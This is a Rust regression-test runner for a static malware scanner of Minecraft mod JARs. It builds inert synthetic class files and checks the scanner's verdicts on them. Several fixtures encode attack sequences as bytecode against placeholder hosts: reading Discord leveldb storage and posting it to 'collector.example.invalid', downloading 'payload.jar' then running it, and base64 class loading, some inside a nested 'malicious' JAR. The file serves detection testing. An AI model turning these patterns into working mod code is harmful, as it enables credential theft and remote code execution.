//! Runs the static scanner against small, synthetic regression fixtures.
//!
//! The fixtures contain only metadata and deliberately inert class files. The
//! scanner never loads classes or native files; this binary only writes the
//! fixture archives into a temporary directory and scans their bytes. A few
//! fixture methods contain synthetic call sequences so the static data-flow
//! parser can be regression-tested without executing a JAR.

// The regression runner consumes the same scanner crate as the API service.
mod models {
    pub use ratscan_core::models::*;
}
mod rules {
    pub use ratscan_core::rules::*;
}
mod scanner {
    pub use ratscan_core::scanner::*;
}

use std::{
    env, fs,
    io::Write,
    path::{Path, PathBuf},
    process::ExitCode,
};

use serde::Deserialize;
use zip::{write::SimpleFileOptions, ZipWriter};

use crate::{
    models::scan::{CodeScope, Verdict},
    rules::engine::RulesEngine,
    scanner::archive::{self, ScanLimits, ScanOutcome},
};

const DEFAULT_FIXTURES_ROOT: &str = "tests/fixtures";
const FIXTURE_SPEC_FILE: &str = "expected.json";
const GENERATED_JAR_NAME: &str = "fixture.jar";
const FIXTURE_CLASS_NAME: &str = "example/regression/Fixture";

#[derive(Debug, Deserialize)]
struct FixtureSpec {
    name: String,
    #[serde(default)]
    scenario: Option<Scenario>,
    expected_verdict: ExpectedVerdict,
    risk_score: ScoreRange,
    #[serde(default)]
    required_findings: Vec<String>,
    #[serde(default)]
    forbidden_findings: Vec<String>,
    #[serde(default)]
    expected_capabilities: Vec<String>,
    #[serde(default)]
    required_confirmed_chains: Vec<String>,
    #[serde(default)]
    forbidden_confirmed_chains: Vec<String>,
    #[serde(default)]
    minimum_analysis_coverage: u8,
    #[serde(default)]
    required_chain_scope: Option<CodeScope>,
    #[serde(default)]
    required_chain_evidence_operations: Vec<String>,
    #[serde(default)]
    required_limitations: Vec<String>,
    #[serde(default)]
    forbidden_limitations: Vec<String>,
    expected_obfuscation_level: models::scan::ObfuscationLevel,
}

#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq)]
#[serde(rename_all = "snake_case")]
enum Scenario {
    ConfigWrite,
    DesktopBrowse,
    FatJarDependencies,
    DiscordRpc,
    AutoUpdater,
    ObfuscatedClean,
    ObfuscatedLoader,
    CredentialStealer,
    ConfigFileSend,
    ProcessBuilderUpdater,
    SafeUpdater,
    IntermethodDownloader,
    NestedMalicious,
    OfficialSkinUpload,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum ExpectedVerdict {
    One(Verdict),
    Any(Vec<Verdict>),
}

impl ExpectedVerdict {
    fn accepts(&self, verdict: &Verdict) -> bool {
        match self {
            Self::One(expected) => expected == verdict,
            Self::Any(expected) => expected.iter().any(|candidate| candidate == verdict),
        }
    }

    fn describe(&self) -> String {
        match self {
            Self::One(verdict) => format!("{verdict:?}").to_ascii_lowercase(),
            Self::Any(verdicts) => verdicts
                .iter()
                .map(|verdict| format!("{verdict:?}").to_ascii_lowercase())
                .collect::<Vec<_>>()
                .join(" or "),
        }
    }
}

#[derive(Debug, Deserialize)]
struct ScoreRange {
    min: u8,
    max: u8,
}

impl ScoreRange {
    fn contains(&self, score: u8) -> bool {
        self.min <= score && score <= self.max
    }
}

#[derive(Debug)]
struct FixtureResult {
    name: String,
    errors: Vec<String>,
    limitations: Vec<String>,
}

fn main() -> ExitCode {
    let fixture_root = match fixture_root_from_args() {
        Ok(path) => path,
        Err(error) => {
            eprintln!("{error}");
            return ExitCode::from(2);
        }
    };

    let specs = match load_fixture_specs(&fixture_root) {
        Ok(specs) => specs,
        Err(error) => {
            eprintln!("failed to load regression fixtures: {error:#}");
            return ExitCode::from(2);
        }
    };
    let rules_path = Path::new(env!("CARGO_MANIFEST_DIR")).join("config/rules.yaml");
    let rules = match RulesEngine::load_from_file(&rules_path) {
        Ok(rules) => rules,
        Err(error) => {
            eprintln!(
                "failed to load rules from {}: {error:#}",
                rules_path.display()
            );
            return ExitCode::from(2);
        }
    };

    let results = specs
        .iter()
        .map(|(path, spec)| run_fixture(path, spec, &rules))
        .collect::<Vec<_>>();
    print_results(&results);

    if results.iter().any(|result| !result.errors.is_empty()) {
        ExitCode::from(1)
    } else {
        ExitCode::SUCCESS
    }
}

fn fixture_root_from_args() -> anyhow::Result<PathBuf> {
    let mut args = env::args_os();
    let _program = args.next();
    let path = args
        .next()
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from(DEFAULT_FIXTURES_ROOT));
    if args.next().is_some() {
        anyhow::bail!("usage: cargo run --bin regression-scan -- [fixtures-directory]");
    }
    Ok(path)
}

fn load_fixture_specs(root: &Path) -> anyhow::Result<Vec<(PathBuf, FixtureSpec)>> {
    let mut specs = Vec::new();
    for entry in fs::read_dir(root)? {
        let entry = entry?;
        if !entry.file_type()?.is_dir() {
            continue;
        }
        let spec_path = entry.path().join(FIXTURE_SPEC_FILE);
        if !spec_path.is_file() {
            continue;
        }
        let source = fs::read_to_string(&spec_path)?;
        let spec = serde_json::from_str(&source)?;
        specs.push((entry.path(), spec));
    }
    specs.sort_by(|left, right| left.0.cmp(&right.0));
    if specs.is_empty() {
        anyhow::bail!(
            "no {FIXTURE_SPEC_FILE} files found below {}",
            root.display()
        );
    }
    Ok(specs)
}

fn run_fixture(path: &Path, spec: &FixtureSpec, rules: &RulesEngine) -> FixtureResult {
    let mut errors = validate_spec(spec);
    let mut limitations = Vec::new();
    let temporary_directory = match tempfile::tempdir() {
        Ok(directory) => directory,
        Err(error) => {
            errors.push(format!(
                "could not create temporary fixture directory: {error}"
            ));
            return FixtureResult {
                name: spec.name.clone(),
                errors,
                limitations,
            };
        }
    };
    let compiled_archive = path.join(GENERATED_JAR_NAME);
    let using_compiled_archive = compiled_archive.is_file();
    let archive_path = if using_compiled_archive {
        compiled_archive
    } else {
        let archive_path = temporary_directory.path().join(GENERATED_JAR_NAME);
        let Some(scenario) = spec.scenario else {
            errors.push("fixture must provide fixture.jar or a synthetic scenario".to_owned());
            return FixtureResult {
                name: spec.name.clone(),
                errors,
                limitations,
            };
        };
        if let Err(error) = materialize_fixture(&archive_path, scenario) {
            errors.push(format!(
                "could not generate safe fixture archive: {error:#}"
            ));
            return FixtureResult {
                name: spec.name.clone(),
                errors,
                limitations,
            };
        }
        archive_path
    };

    let outcome = archive::scan_file(&archive_path, default_limits(), rules);
    errors.extend(assert_report(spec, &outcome));
    let source_kind = if using_compiled_archive {
        "compiled JAR; no code was executed"
    } else {
        "generated at scan time; no code was executed"
    };
    limitations.push(format!(
        "fixture source: {} ({source_kind})",
        path.display()
    ));
    FixtureResult {
        name: spec.name.clone(),
        errors,
        limitations,
    }
}

fn validate_spec(spec: &FixtureSpec) -> Vec<String> {
    let mut errors = Vec::new();
    if spec.name.trim().is_empty() {
        errors.push("fixture name must not be empty".to_owned());
    }
    if spec.risk_score.min > spec.risk_score.max {
        errors.push("risk_score.min must not exceed risk_score.max".to_owned());
    }
    for rule_id in &spec.required_findings {
        if spec.forbidden_findings.contains(rule_id) {
            errors.push(format!("rule {rule_id} is both required and forbidden"));
        }
    }
    errors
}

fn assert_report(spec: &FixtureSpec, outcome: &ScanOutcome) -> Vec<String> {
    let mut errors = Vec::new();
    let report = &outcome.report;
    if !spec.expected_verdict.accepts(&report.verdict) {
        errors.push(format!(
            "verdict was {:?}, expected {}",
            report.verdict,
            spec.expected_verdict.describe()
        ));
    }
    if !spec.risk_score.contains(report.risk_score) {
        errors.push(format!(
            "risk score was {}, expected {}..={}",
            report.risk_score, spec.risk_score.min, spec.risk_score.max
        ));
    }
    let finding_ids = report
        .findings
        .iter()
        .map(|finding| finding.rule_id.as_str())
        .chain(
            report
                .confirmed_chains
                .iter()
                .map(|chain| chain.rule_id.as_str()),
        )
        .collect::<Vec<_>>();
    for required in &spec.required_findings {
        if !finding_ids.contains(&required.as_str()) {
            errors.push(format!("required finding {required} was absent"));
        }
    }
    for forbidden in &spec.forbidden_findings {
        if finding_ids.contains(&forbidden.as_str()) {
            errors.push(format!("forbidden finding {forbidden} was present"));
        }
    }
    let capability_ids = report
        .capabilities
        .iter()
        .map(|capability| capability.rule_id.as_str())
        .collect::<Vec<_>>();
    for capability in &spec.expected_capabilities {
        if !capability_ids.contains(&capability.as_str()) {
            errors.push(format!("expected capability {capability} was absent"));
        }
    }
    if report.obfuscation.level != spec.expected_obfuscation_level {
        errors.push(format!(
            "obfuscation level was {:?}, expected {:?}",
            report.obfuscation.level, spec.expected_obfuscation_level
        ));
    }
    let confirmed_chain_ids = report
        .confirmed_chains
        .iter()
        .map(|chain| chain.rule_id.as_str())
        .collect::<Vec<_>>();
    for required in &spec.required_confirmed_chains {
        if !confirmed_chain_ids.contains(&required.as_str()) {
            errors.push(format!("required confirmed chain {required} was absent"));
        }
    }
    for forbidden in &spec.forbidden_confirmed_chains {
        if confirmed_chain_ids.contains(&forbidden.as_str()) {
            errors.push(format!("forbidden confirmed chain {forbidden} was present"));
        }
    }
    for operation in &spec.required_chain_evidence_operations {
        if !report.confirmed_chains.iter().any(|chain| {
            chain
                .evidence
                .iter()
                .any(|evidence| evidence.operation.contains(operation))
        }) {
            errors.push(format!(
                "required chain evidence operation {operation} was absent"
            ));
        }
    }
    let limitation_codes = report
        .limitations
        .iter()
        .map(|limitation| limitation.code.as_str())
        .collect::<Vec<_>>();
    for required in &spec.required_limitations {
        if !limitation_codes.contains(&required.as_str()) {
            errors.push(format!("required limitation {required} was absent"));
        }
    }
    for forbidden in &spec.forbidden_limitations {
        if limitation_codes.contains(&forbidden.as_str()) {
            errors.push(format!("forbidden limitation {forbidden} was present"));
        }
    }
    if let Some(scope) = &spec.required_chain_scope {
        if !report.confirmed_chains.iter().any(|chain| {
            chain
                .evidence
                .iter()
                .any(|evidence| evidence.scope == *scope)
        }) {
            let scopes = report
                .confirmed_chains
                .iter()
                .flat_map(|chain| chain.evidence.iter().map(|evidence| evidence.scope.clone()))
                .collect::<Vec<_>>();
            errors.push(format!(
                "no confirmed-chain evidence had scope {scope:?}; observed {scopes:?}"
            ));
        }
    }
    if report.analysis_coverage.overall_score < spec.minimum_analysis_coverage {
        errors.push(format!(
            "analysis coverage was {}, expected at least {}",
            report.analysis_coverage.overall_score, spec.minimum_analysis_coverage
        ));
    }
    errors
}

fn print_results(results: &[FixtureResult]) {
    for result in results {
        if result.errors.is_empty() {
            println!("PASS {}", result.name);
        } else {
            println!("FAIL {}", result.name);
            for error in &result.errors {
                println!("  - {error}");
            }
        }
        for limitation in &result.limitations {
            println!("  limitation: {limitation}");
        }
    }
    let failed = results
        .iter()
        .filter(|result| !result.errors.is_empty())
        .count();
    println!("{} fixtures, {} failed", results.len(), failed);
}

fn default_limits() -> ScanLimits {
    ScanLimits {
        max_total_uncompressed_bytes: 10 * 1024 * 1024,
        max_files_in_archive: 100,
        max_nesting_depth: 3,
        max_single_file_bytes: 2 * 1024 * 1024,
    }
}

fn materialize_fixture(destination: &Path, scenario: Scenario) -> anyhow::Result<()> {
    let file = fs::File::create(destination)?;
    let mut archive = ZipWriter::new(file);
    let options = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);

    write_entry(
        &mut archive,
        "fabric.mod.json",
        br#"{"schemaVersion":1,"id":"regressionfixture","entrypoints":{"main":["example.regression.Fixture"]}}"#,
        options,
    )?;
    let definition = ScenarioDefinition::from(scenario);
    write_entry(
        &mut archive,
        &format!("{FIXTURE_CLASS_NAME}.class"),
        &minimal_class(FIXTURE_CLASS_NAME, &definition.methods),
        options,
    )?;
    for (path, bytes) in definition.resources {
        write_entry(&mut archive, path, bytes, options)?;
    }
    if scenario == Scenario::NestedMalicious {
        write_entry(
            &mut archive,
            "nested-mods/nested-malicious.jar",
            &nested_malicious_jar()?,
            options,
        )?;
    }
    archive.finish()?;
    Ok(())
}

fn write_entry(
    archive: &mut ZipWriter<fs::File>,
    path: &str,
    bytes: &[u8],
    options: SimpleFileOptions,
) -> anyhow::Result<()> {
    archive.start_file(path, options)?;
    archive.write_all(bytes)?;
    Ok(())
}

struct ScenarioDefinition {
    methods: Vec<MethodDefinition>,
    resources: Vec<(&'static str, &'static [u8])>,
}

#[derive(Clone, Copy)]
struct MethodReference {
    owner: &'static str,
    name: &'static str,
    descriptor: &'static str,
}

#[derive(Clone)]
struct MethodDefinition {
    name: &'static str,
    instructions: Vec<FixtureInstruction>,
}

#[derive(Clone)]
enum FixtureInstruction {
    LoadString(&'static str),
    StoreLocal(u8),
    LoadLocal(u8),
    New(&'static str),
    Dup,
    InvokeStatic(MethodReference),
    InvokeSpecial(MethodReference),
    InvokeVirtual(MethodReference),
    Pop,
    Return,
}

impl MethodDefinition {
    fn capability(
        name: &'static str,
        reference: MethodReference,
        value: Option<&'static str>,
    ) -> Self {
        let mut instructions = Vec::new();
        if let Some(value) = value {
            instructions.push(FixtureInstruction::LoadString(value));
            instructions.push(FixtureInstruction::StoreLocal(0));
            instructions.push(FixtureInstruction::LoadLocal(0));
        }
        instructions.push(FixtureInstruction::InvokeStatic(reference));
        if !reference.descriptor.ends_with(")V") {
            instructions.push(FixtureInstruction::Pop);
        }
        instructions.push(FixtureInstruction::Return);
        Self { name, instructions }
    }
}

const FILES_WRITE: MethodReference = MethodReference {
    owner: "java/nio/file/Files",
    name: "write",
    descriptor: "(Ljava/lang/String;[B)V",
};
const FILES_READ_ALL_BYTES: MethodReference = MethodReference {
    owner: "java/nio/file/Files",
    name: "readAllBytes",
    descriptor: "(Ljava/lang/String;)[B",
};
const HTTP_DOWNLOAD: MethodReference = MethodReference {
    owner: "java/net/http/HttpClient",
    name: "send",
    descriptor: "(Ljava/lang/String;)[B",
};
const HTTP_POST: MethodReference = MethodReference {
    owner: "java/net/http/HttpClient",
    name: "post",
    descriptor: "(Ljava/lang/String;[B)V",
};
const RUNTIME_EXEC: MethodReference = MethodReference {
    owner: "java/lang/Runtime",
    name: "exec",
    descriptor: "(Ljava/lang/String;)Ljava/lang/Process;",
};
const BASE64_GET_DECODER: MethodReference = MethodReference {
    owner: "java/util/Base64",
    name: "getDecoder",
    descriptor: "()Ljava/util/Base64$Decoder;",
};
const BASE64_DECODE: MethodReference = MethodReference {
    owner: "java/util/Base64$Decoder",
    name: "decode",
    descriptor: "(Ljava/lang/String;)[B",
};
const USER_GET_ACCESS_TOKEN: MethodReference = MethodReference {
    owner: "net/minecraft/client/User",
    name: "getAccessToken",
    descriptor: "()Ljava/lang/String;",
};
const DEFINE_CLASS: MethodReference = MethodReference {
    owner: "java/lang/ClassLoader",
    name: "defineClass",
    descriptor: "([B)Ljava/lang/Class;",
};

impl From<Scenario> for ScenarioDefinition {
    fn from(scenario: Scenario) -> Self {
        match scenario {
            Scenario::ConfigWrite => Self {
                methods: vec![MethodDefinition::capability(
                    "saveConfig",
                    MethodReference {
                        owner: "java/nio/file/Files",
                        name: "write",
                        descriptor: "(Ljava/lang/String;)V",
                    },
                    Some("config/regressionfixture.json"),
                )],
                resources: Vec::new(),
            },
            Scenario::DesktopBrowse => Self {
                methods: vec![MethodDefinition {
                    name: "openWiki",
                    instructions: vec![
                        FixtureInstruction::LoadString("https://wiki.example.invalid/regression"),
                        FixtureInstruction::StoreLocal(0),
                        FixtureInstruction::InvokeStatic(MethodReference {
                            owner: "java/awt/Desktop",
                            name: "getDesktop",
                            descriptor: "()Ljava/awt/Desktop;",
                        }),
                        FixtureInstruction::LoadLocal(0),
                        FixtureInstruction::InvokeVirtual(MethodReference {
                            owner: "java/awt/Desktop",
                            name: "browse",
                            descriptor: "(Ljava/lang/String;)V",
                        }),
                        FixtureInstruction::Return,
                    ],
                }],
                resources: Vec::new(),
            },
            Scenario::FatJarDependencies => Self {
                methods: vec![
                    MethodDefinition::capability(
                        "reflect",
                        MethodReference {
                            owner: "java/lang/reflect/Method",
                            name: "invoke",
                            descriptor: "()V",
                        },
                        None,
                    ),
                    MethodDefinition::capability("base64", BASE64_GET_DECODER, None),
                ],
                resources: vec![
                    ("META-INF/jars/jna-5.14.0.jar", empty_jar_bytes()),
                    ("META-INF/jars/zip4j-2.11.5.jar", empty_jar_bytes()),
                    ("jni/jffi/jnidispatch.dll", b"MZsafe-known-dependency"),
                ],
            },
            Scenario::DiscordRpc => Self {
                methods: vec![
                    MethodDefinition::capability(
                        "loadDiscordRpc",
                        MethodReference {
                            owner: "java/lang/System",
                            name: "loadLibrary",
                            descriptor: "(Ljava/lang/String;)V",
                        },
                        Some("discord-rpc"),
                    ),
                    MethodDefinition::capability(
                        "mediaIntegration",
                        MethodReference {
                            owner: "java/lang/ProcessBuilder",
                            name: "start",
                            descriptor: "()Ljava/lang/Process;",
                        },
                        Some("media player integration"),
                    ),
                ],
                resources: vec![(
                    "mediaplayerinfo/natives/discord-rpc.dll",
                    b"MZsafe-discord-fixture",
                )],
            },
            Scenario::AutoUpdater => Self {
                methods: vec![download_write_execute_method("downloadWriteExecute")],
                resources: Vec::new(),
            },
            Scenario::ObfuscatedClean => Self {
                methods: vec![MethodDefinition {
                    name: "a",
                    instructions: vec![
                        FixtureInstruction::LoadString("configuration value"),
                        FixtureInstruction::StoreLocal(0),
                        FixtureInstruction::InvokeStatic(BASE64_GET_DECODER),
                        FixtureInstruction::Pop,
                        FixtureInstruction::Return,
                    ],
                }],
                resources: Vec::new(),
            },
            Scenario::ObfuscatedLoader => Self {
                methods: vec![
                    download_write_execute_method("a"),
                    base64_define_class_method(),
                ],
                resources: Vec::new(),
            },
            Scenario::CredentialStealer => Self {
                methods: vec![credential_exfiltration_method()],
                resources: Vec::new(),
            },
            Scenario::ConfigFileSend => Self {
                methods: vec![config_file_send_method()],
                resources: Vec::new(),
            },
            Scenario::ProcessBuilderUpdater => Self {
                methods: vec![process_builder_download_write_execute_method()],
                resources: Vec::new(),
            },
            Scenario::SafeUpdater => Self {
                methods: vec![
                    download_write_execute_method("verifiedUpdate"),
                    MethodDefinition {
                        name: "verifyIntegrity",
                        instructions: vec![
                            FixtureInstruction::LoadString("SHA-256 update checksum"),
                            FixtureInstruction::StoreLocal(0),
                            FixtureInstruction::Return,
                        ],
                    },
                ],
                resources: Vec::new(),
            },
            Scenario::IntermethodDownloader => Self {
                methods: vec![
                    intermethod_download_method(),
                    intermethod_save_and_launch_method(),
                ],
                resources: Vec::new(),
            },
            Scenario::NestedMalicious => Self {
                methods: Vec::new(),
                resources: Vec::new(),
            },
            Scenario::OfficialSkinUpload => Self {
                methods: vec![official_skin_upload_method()],
                resources: Vec::new(),
            },
        }
    }
}

fn download_write_execute_method(name: &'static str) -> MethodDefinition {
    MethodDefinition {
        name,
        instructions: vec![
            FixtureInstruction::LoadString("https://updates.example.invalid/payload.jar"),
            FixtureInstruction::StoreLocal(0),
            FixtureInstruction::LoadLocal(0),
            FixtureInstruction::InvokeStatic(HTTP_DOWNLOAD),
            FixtureInstruction::StoreLocal(1),
            FixtureInstruction::LoadString("mod-update.jar"),
            FixtureInstruction::StoreLocal(2),
            FixtureInstruction::LoadLocal(2),
            FixtureInstruction::LoadLocal(1),
            FixtureInstruction::InvokeStatic(FILES_WRITE),
            FixtureInstruction::LoadLocal(2),
            FixtureInstruction::StoreLocal(3),
            FixtureInstruction::LoadLocal(3),
            FixtureInstruction::InvokeStatic(RUNTIME_EXEC),
            FixtureInstruction::Pop,
            FixtureInstruction::Return,
        ],
    }
}

fn credential_exfiltration_method() -> MethodDefinition {
    MethodDefinition {
        name: "readCredentialsAndExfiltrate",
        instructions: vec![
            FixtureInstruction::LoadString("discord/Local Storage/leveldb"),
            FixtureInstruction::StoreLocal(0),
            FixtureInstruction::LoadLocal(0),
            FixtureInstruction::InvokeStatic(FILES_READ_ALL_BYTES),
            FixtureInstruction::StoreLocal(1),
            FixtureInstruction::LoadString("https://collector.example.invalid/upload"),
            FixtureInstruction::StoreLocal(2),
            FixtureInstruction::LoadLocal(2),
            FixtureInstruction::LoadLocal(1),
            FixtureInstruction::InvokeStatic(HTTP_POST),
            FixtureInstruction::Return,
        ],
    }
}

/// Mirrors the Entity Texture Features skin editor: the session token is read and a skin is
/// posted to the official Minecraft services API.
fn official_skin_upload_method() -> MethodDefinition {
    MethodDefinition {
        name: "uploadSkin",
        instructions: vec![
            FixtureInstruction::InvokeStatic(USER_GET_ACCESS_TOKEN),
            FixtureInstruction::StoreLocal(0),
            FixtureInstruction::LoadString("skin_printout.png"),
            FixtureInstruction::StoreLocal(1),
            FixtureInstruction::LoadLocal(1),
            FixtureInstruction::InvokeStatic(FILES_READ_ALL_BYTES),
            FixtureInstruction::StoreLocal(2),
            FixtureInstruction::LoadString(
                "https://api.minecraftservices.com/minecraft/profile/skins",
            ),
            FixtureInstruction::StoreLocal(3),
            FixtureInstruction::LoadLocal(3),
            FixtureInstruction::LoadLocal(2),
            FixtureInstruction::InvokeStatic(HTTP_POST),
            FixtureInstruction::Return,
        ],
    }
}

fn config_file_send_method() -> MethodDefinition {
    MethodDefinition {
        name: "sendConfig",
        instructions: vec![
            FixtureInstruction::LoadString("config/regressionfixture.json"),
            FixtureInstruction::StoreLocal(0),
            FixtureInstruction::LoadLocal(0),
            FixtureInstruction::InvokeStatic(FILES_READ_ALL_BYTES),
            FixtureInstruction::StoreLocal(1),
            FixtureInstruction::LoadString("https://sync.example.invalid/config"),
            FixtureInstruction::StoreLocal(2),
            FixtureInstruction::LoadLocal(2),
            FixtureInstruction::LoadLocal(1),
            FixtureInstruction::InvokeStatic(HTTP_POST),
            FixtureInstruction::Return,
        ],
    }
}

fn process_builder_download_write_execute_method() -> MethodDefinition {
    MethodDefinition {
        name: "processBuilderUpdate",
        instructions: vec![
            FixtureInstruction::LoadString("https://updates.example.invalid/payload.jar"),
            FixtureInstruction::StoreLocal(0),
            FixtureInstruction::LoadLocal(0),
            FixtureInstruction::InvokeStatic(HTTP_DOWNLOAD),
            FixtureInstruction::StoreLocal(1),
            FixtureInstruction::LoadString("mod-update.jar"),
            FixtureInstruction::StoreLocal(2),
            FixtureInstruction::LoadLocal(2),
            FixtureInstruction::LoadLocal(1),
            FixtureInstruction::InvokeStatic(FILES_WRITE),
            FixtureInstruction::New("java/lang/ProcessBuilder"),
            FixtureInstruction::Dup,
            FixtureInstruction::LoadString("java"),
            FixtureInstruction::LoadString("-jar"),
            FixtureInstruction::LoadLocal(2),
            FixtureInstruction::InvokeSpecial(MethodReference {
                owner: "java/lang/ProcessBuilder",
                name: "<init>",
                descriptor: "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V",
            }),
            FixtureInstruction::StoreLocal(3),
            FixtureInstruction::LoadLocal(3),
            FixtureInstruction::InvokeVirtual(MethodReference {
                owner: "java/lang/ProcessBuilder",
                name: "start",
                descriptor: "()Ljava/lang/Process;",
            }),
            FixtureInstruction::Pop,
            FixtureInstruction::Return,
        ],
    }
}

fn intermethod_download_method() -> MethodDefinition {
    MethodDefinition {
        name: "download",
        instructions: vec![
            FixtureInstruction::LoadString("https://updates.example.invalid/payload.jar"),
            FixtureInstruction::StoreLocal(0),
            FixtureInstruction::LoadLocal(0),
            FixtureInstruction::InvokeStatic(HTTP_DOWNLOAD),
            FixtureInstruction::StoreLocal(1),
            FixtureInstruction::LoadLocal(1),
            FixtureInstruction::InvokeStatic(MethodReference {
                owner: FIXTURE_CLASS_NAME,
                name: "saveAndLaunch",
                descriptor: "([B)V",
            }),
            FixtureInstruction::Return,
        ],
    }
}

fn intermethod_save_and_launch_method() -> MethodDefinition {
    MethodDefinition {
        name: "saveAndLaunch",
        instructions: vec![
            FixtureInstruction::LoadString("mod-update.jar"),
            FixtureInstruction::StoreLocal(1),
            FixtureInstruction::LoadLocal(1),
            FixtureInstruction::LoadLocal(0),
            FixtureInstruction::InvokeStatic(FILES_WRITE),
            FixtureInstruction::LoadLocal(1),
            FixtureInstruction::InvokeStatic(RUNTIME_EXEC),
            FixtureInstruction::Pop,
            FixtureInstruction::Return,
        ],
    }
}

fn base64_define_class_method() -> MethodDefinition {
    MethodDefinition {
        name: "decodeAndDefineClass",
        instructions: vec![
            FixtureInstruction::LoadString("Zml4dHVyZS1jbGFzcy1ieXRlcw=="),
            FixtureInstruction::StoreLocal(0),
            FixtureInstruction::InvokeStatic(BASE64_GET_DECODER),
            FixtureInstruction::LoadLocal(0),
            FixtureInstruction::InvokeVirtual(BASE64_DECODE),
            FixtureInstruction::StoreLocal(1),
            FixtureInstruction::LoadLocal(1),
            FixtureInstruction::InvokeStatic(DEFINE_CLASS),
            FixtureInstruction::Pop,
            FixtureInstruction::Return,
        ],
    }
}

fn empty_jar_bytes() -> &'static [u8] {
    // A stored ZIP with no entries. It is data only and is never executed.
    b"PK\x05\x06\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
}

/// Builds a class file whose methods are only scanned as immutable bytes.
///
/// The generated class has no entry point and `regression-scan` never loads it.
/// Its methods are deliberately small, linear examples of value propagation for
/// the bytecode parser and data-flow tests.
fn minimal_class(class_name: &str, methods: &[MethodDefinition]) -> Vec<u8> {
    let mut pool = ConstantPoolBuilder::default();
    let this_name = pool.utf8(class_name);
    let this_class = pool.class(this_name);
    let object_name = pool.utf8("java/lang/Object");
    let object_class = pool.class(object_name);
    let encoded_methods = methods
        .iter()
        .map(|method| encode_method(&mut pool, method))
        .collect::<Vec<_>>();

    let mut bytes = Vec::new();
    bytes.extend_from_slice(&0xCAFEBABEu32.to_be_bytes());
    bytes.extend_from_slice(&0u16.to_be_bytes());
    bytes.extend_from_slice(&52u16.to_be_bytes());
    bytes.extend_from_slice(&pool.count().to_be_bytes());
    bytes.extend_from_slice(&pool.bytes);
    bytes.extend_from_slice(&0x0021u16.to_be_bytes());
    bytes.extend_from_slice(&this_class.to_be_bytes());
    bytes.extend_from_slice(&object_class.to_be_bytes());
    bytes.extend_from_slice(&0u16.to_be_bytes());
    bytes.extend_from_slice(&0u16.to_be_bytes());
    bytes.extend_from_slice(&(encoded_methods.len() as u16).to_be_bytes());
    for method in encoded_methods {
        bytes.extend_from_slice(&method);
    }
    bytes.extend_from_slice(&0u16.to_be_bytes());
    bytes
}

fn encode_method(pool: &mut ConstantPoolBuilder, method: &MethodDefinition) -> Vec<u8> {
    let method_name = pool.utf8(method.name);
    let descriptor = pool.utf8(fixture_method_descriptor(method.name));
    let code_name = pool.utf8("Code");
    let mut code = Vec::new();
    let mut max_local = 0;

    for instruction in &method.instructions {
        match instruction {
            FixtureInstruction::LoadString(value) => {
                code.push(0x13); // ldc_w
                code.extend_from_slice(&pool.string(value).to_be_bytes());
            }
            FixtureInstruction::StoreLocal(index) => {
                code.extend_from_slice(&[0x3a, *index]); // astore
                max_local = max_local.max(*index);
            }
            FixtureInstruction::LoadLocal(index) => {
                code.extend_from_slice(&[0x19, *index]); // aload
                max_local = max_local.max(*index);
            }
            FixtureInstruction::New(class_name) => {
                code.push(0xbb);
                let name = pool.utf8(class_name);
                code.extend_from_slice(&pool.class(name).to_be_bytes());
            }
            FixtureInstruction::Dup => code.push(0x59),
            FixtureInstruction::InvokeStatic(reference) => {
                code.push(0xb8);
                code.extend_from_slice(&pool.reference(*reference).to_be_bytes());
            }
            FixtureInstruction::InvokeSpecial(reference) => {
                code.push(0xb7);
                code.extend_from_slice(&pool.reference(*reference).to_be_bytes());
            }
            FixtureInstruction::InvokeVirtual(reference) => {
                code.push(0xb6);
                code.extend_from_slice(&pool.reference(*reference).to_be_bytes());
            }
            FixtureInstruction::Pop => code.push(0x57),
            FixtureInstruction::Return => code.push(0xb1),
        }
    }

    let mut code_attribute = Vec::new();
    code_attribute.extend_from_slice(&4u16.to_be_bytes());
    code_attribute.extend_from_slice(&(u16::from(max_local) + 1).to_be_bytes());
    code_attribute.extend_from_slice(&(code.len() as u32).to_be_bytes());
    code_attribute.extend_from_slice(&code);
    code_attribute.extend_from_slice(&0u16.to_be_bytes()); // exception table
    code_attribute.extend_from_slice(&0u16.to_be_bytes()); // nested attributes

    let mut encoded = Vec::new();
    encoded.extend_from_slice(&0x0009u16.to_be_bytes()); // public static
    encoded.extend_from_slice(&method_name.to_be_bytes());
    encoded.extend_from_slice(&descriptor.to_be_bytes());
    encoded.extend_from_slice(&1u16.to_be_bytes());
    encoded.extend_from_slice(&code_name.to_be_bytes());
    encoded.extend_from_slice(&(code_attribute.len() as u32).to_be_bytes());
    encoded.extend_from_slice(&code_attribute);
    encoded
}

fn fixture_method_descriptor(method_name: &str) -> &'static str {
    match method_name {
        "saveAndLaunch" => "([B)V",
        _ => "()V",
    }
}

fn nested_malicious_jar() -> anyhow::Result<Vec<u8>> {
    let cursor = std::io::Cursor::new(Vec::new());
    let mut archive = ZipWriter::new(cursor);
    let options = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
    archive.start_file("fabric.mod.json", options)?;
    archive.write_all(
        br#"{"schemaVersion":1,"id":"nestedmalicious","entrypoints":{"main":["nested.Mal"]}}"#,
    )?;
    archive.start_file("nested/Mal.class", options)?;
    archive.write_all(&minimal_class(
        "nested/Mal",
        &[download_write_execute_method("run")],
    ))?;
    Ok(archive.finish()?.into_inner())
}

#[derive(Default)]
struct ConstantPoolBuilder {
    bytes: Vec<u8>,
    entries: u16,
}

impl ConstantPoolBuilder {
    fn count(&self) -> u16 {
        self.entries + 1
    }

    fn next_index(&mut self) -> u16 {
        self.entries += 1;
        self.entries
    }

    fn utf8(&mut self, value: &str) -> u16 {
        let index = self.next_index();
        self.bytes.push(1);
        self.bytes
            .extend_from_slice(&(value.len() as u16).to_be_bytes());
        self.bytes.extend_from_slice(value.as_bytes());
        index
    }

    fn string(&mut self, value: &str) -> u16 {
        let value_index = self.utf8(value);
        let index = self.next_index();
        self.bytes.push(8);
        self.bytes.extend_from_slice(&value_index.to_be_bytes());
        index
    }

    fn class(&mut self, name_index: u16) -> u16 {
        let index = self.next_index();
        self.bytes.push(7);
        self.bytes.extend_from_slice(&name_index.to_be_bytes());
        index
    }

    fn name_and_type(&mut self, name_index: u16, descriptor_index: u16) -> u16 {
